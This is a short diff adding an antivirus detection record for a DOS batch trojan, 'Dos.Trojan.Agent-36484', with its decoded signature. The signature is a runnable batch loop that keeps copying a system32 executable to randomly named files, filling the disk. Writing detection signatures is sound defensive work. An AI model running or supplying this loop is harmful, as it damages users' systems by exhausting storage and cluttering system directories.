@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36484
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off :newbie copy c:\windows\system32\qchk.exe c:\windows\system32\%random%.%random%.exe cls goto newbie 
